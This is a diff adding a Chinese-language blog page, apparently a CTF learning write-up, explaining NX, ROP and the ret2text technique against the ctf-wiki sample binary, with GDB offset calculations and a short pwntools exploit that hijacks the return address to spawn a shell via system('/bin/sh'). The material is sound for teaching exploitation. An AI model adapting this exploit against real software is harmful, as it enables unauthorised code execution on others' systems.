@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Preface随着NX保护机制的开启，直接往栈或堆上注入代码的方式不再能达成效果。 这时候ROP技术的提出达成了绕过NX的目的。 1、NX NX(No-eXecute),不可执行，DEP(Data Execution Prevention),数据执行保护。Linux下为NX，Windows为DEP。 其能够在内存上执行额外检查以防止在系统上运行恶意代码。 通过将数据所在内存页标识为不可执行，当程序">
+<meta property="og:type" content="article">
+<meta property="og:title" content="stackoverflow之ret2text">
+<meta property="og:url" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/index.html">
+<meta property="og:site_name" content="Rj45mp&#39;s blog">
+<meta property="og:description" content="Preface随着NX保护机制的开启，直接往栈或堆上注入代码的方式不再能达成效果。 这时候ROP技术的提出达成了绕过NX的目的。 1、NX NX(No-eXecute),不可执行，DEP(Data Execution Prevention),数据执行保护。Linux下为NX，Windows为DEP。 其能够在内存上执行额外检查以防止在系统上运行恶意代码。 通过将数据所在内存页标识为不可执行，当程序">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/image-20191202210756468.png">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/image-20191202224830961.png">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/image-20191202225304556.png">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/image-20191203000629226.png">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/image-20191203001233776.png">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/image-20191203002814530.png">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/image-20191203004410662.png">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/image-20191203005546341.png">
+<meta property="og:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/image-20191203010428148.png">
+<meta property="article:published_time" content="2019-12-02T07:14:03.000Z">
+<meta property="article:modified_time" content="2019-12-02T17:39:19.004Z">
+<meta property="article:author" content="Rj45mp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/image-20191202210756468.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/Rj45mp.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/Rj45mp.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/Rj45mp.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>stackoverflow之ret2text</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/firends/">Firends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/stackoverflow%E4%B9%8Bret2shellcode/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/stackoverflow%E4%B9%8Bstack-pivoting/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/&text=stackoverflow之ret2text"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/&title=stackoverflow之ret2text"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/&is_video=false&description=stackoverflow之ret2text"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=stackoverflow之ret2text&body=Check out this article: https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/&title=stackoverflow之ret2text"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/&title=stackoverflow之ret2text"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/&title=stackoverflow之ret2text"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/&title=stackoverflow之ret2text"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/&name=stackoverflow之ret2text&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/&t=stackoverflow之ret2text"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Preface"><span class="toc-number">1.</span> <span class="toc-text">Preface</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ret2text"><span class="toc-number">2.</span> <span class="toc-text">Ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example"><span class="toc-number">3.</span> <span class="toc-text">Example</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">4.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        stackoverflow之ret2text
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Rj45mp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-12-02T07:14:03.000Z" itemprop="datePublished">2019-12-02</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>随着NX保护机制的开启，直接往栈或堆上注入代码的方式不再能达成效果。</p>
+<p>这时候ROP技术的提出达成了绕过NX的目的。</p>
+<p><strong>1、NX</strong></p>
+<p>NX(No-eXecute),不可执行，DEP(Data Execution Prevention),数据执行保护。Linux下为NX，Windows为DEP。</p>
+<p>其能够在内存上执行额外检查以防止在系统上运行恶意代码。</p>
+<p>通过将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时， 程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是执行shellcode。</p>
+<p>NX保护机制的开关：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc nx.c -o nx  #默认情况下，开启NX保护机制 </span><br><span class="line">gcc -z execstack nx.c -o nx #关闭NX保护机制 </span><br><span class="line">gcc -z noexecstack nx.c -o nx   #开启NX保护机制</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>2、ROP</strong></p>
+<p>ROP(Return Oriented Programming),在缓冲区溢出的基础上，利用程序中已有的gadgets来改变某些寄存器或变量值，从而控制程序的执行流程。</p>
+<p>ROP攻击的条件：</p>
+<ul>
+<li>存在溢出且可控制返回地址。</li>
+<li>存在满足条件的gadgets和gadgets的地址。</li>
+</ul>
+<p><strong>3、gadgets</strong></p>
+<p>以ret结尾的指令序列。通过这些指令序列，可以改变某些地址的内容，方便控制程序的执行流程。</p>
+<p>ROP就是利用指令集中的ret指令，改变指令流的执行顺序。</p>
+<h2 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h2><p>ret2text,基本ROP之一,控制程序执行本身已有的代码(.text)。</p>
+<h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>以 github-ctf-wiki中的ret2text样例程序举例：</p>
+<p><img src="/stackoverflow%E4%B9%8Bret2text/image-20191202210756468.png" alt="image-20191202210756468"></p>
+<p>32位的binary，开启了NX。</p>
+<p><strong>1、IDA：</strong></p>
+<p><img src="/stackoverflow%E4%B9%8Bret2text/image-20191202224830961.png" alt="image-20191202224830961"></p>
+<p>可以看到，危险函数gets，在没有控制好写入空间大小的情况下，可向内存写入一段<code>0x64</code>大小的数据。</p>
+<p><img src="/stackoverflow%E4%B9%8Bret2text/image-20191202225304556.png" alt="image-20191202225304556"></p>
+<p>同时binary中还有一个后面<code>secure</code>函数，其内调用了<code>systen(&quot;/bin/sh&quot;)</code>。</p>
+<p><strong>2、GDB：</strong></p>
+<p>根据前面IDA的分析，可以看到该binary中存在栈溢出，那么溢出空间的偏移量是<code>0x64</code>吗？</p>
+<p>这里我用gdb调试说明：</p>
+<p>可以看到s的位置在[esp+0x1c]，把断点设置为call gets函数处<code>0x80486ae</code>。</p>
+<p><img src="/stackoverflow%E4%B9%8Bret2text/image-20191203000629226.png" alt="image-20191203000629226"></p>
+<p>可以看到ebp&#x3D;0xffffd048；esp&#x3D;0xffffcfc0，s的地址&#x3D;esp+0x1c&#x3D;0xffffcfc0+0x1c&#x3D;0xffffcfdc。</p>
+<p><img src="/stackoverflow%E4%B9%8Bret2text/image-20191203001233776.png" alt="image-20191203001233776"></p>
+<p>那么，相对于ebp的偏移量为<code>offset=ebp-s_addr=0xffffd048-0xffffcfdc=0x6c</code>。相对于ret_addr的偏移量<code>offset=0x6c+4</code>。</p>
+<p>另一种解释：可以看到在IDA的伪代码中发现</p>
+<p><img src="/stackoverflow%E4%B9%8Bret2text/image-20191203002814530.png" alt="image-20191203002814530"></p>
+<p>__cdecl 函数调用约定会把形参自右向左依次压入栈中。</p>
+<p>一般情况是一个参数，所以相对于ret_addr的偏移量<code>offset=0x64+4</code>，现在有两个形参，所以<code>offset=0x64+4+4+4</code>。</p>
+<p><a href="%5Bhttps://rj45mp.github.io/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/%5D(https://rj45mp.github.io/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/)">__cdecl介绍</a></p>
+<p><strong>3、pwn：</strong></p>
+<p><img src="/stackoverflow%E4%B9%8Bret2text/image-20191203004410662.png" alt="image-20191203004410662"></p>
+<p>劫持到system(“&#x2F;bin&#x2F;sh”)</p>
+<p><img src="/stackoverflow%E4%B9%8Bret2text/image-20191203005546341.png" alt="image-20191203005546341"></p>
+<p><strong>4、exploit：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">offset = 0x6c+4</span><br><span class="line">p = process(&quot;./ret2text&quot;)</span><br><span class="line">system_addr = 0x804863a</span><br><span class="line">payload = &#x27;\x90&#x27;*offset+p32(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/stackoverflow%E4%B9%8Bret2text/image-20191203010428148.png" alt="image-20191203010428148"></p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p> github-ctf-wiki </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/firends/">Firends</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Preface"><span class="toc-number">1.</span> <span class="toc-text">Preface</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ret2text"><span class="toc-number">2.</span> <span class="toc-text">Ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example"><span class="toc-number">3.</span> <span class="toc-text">Example</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">4.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/&text=stackoverflow之ret2text"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/&title=stackoverflow之ret2text"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/&is_video=false&description=stackoverflow之ret2text"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=stackoverflow之ret2text&body=Check out this article: https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/&title=stackoverflow之ret2text"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/&title=stackoverflow之ret2text"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/&title=stackoverflow之ret2text"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/&title=stackoverflow之ret2text"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/&name=stackoverflow之ret2text&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rj45mp.github.io/stackoverflow%E4%B9%8Bret2text/&t=stackoverflow之ret2text"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    Rj45mp
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/firends/">Firends</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
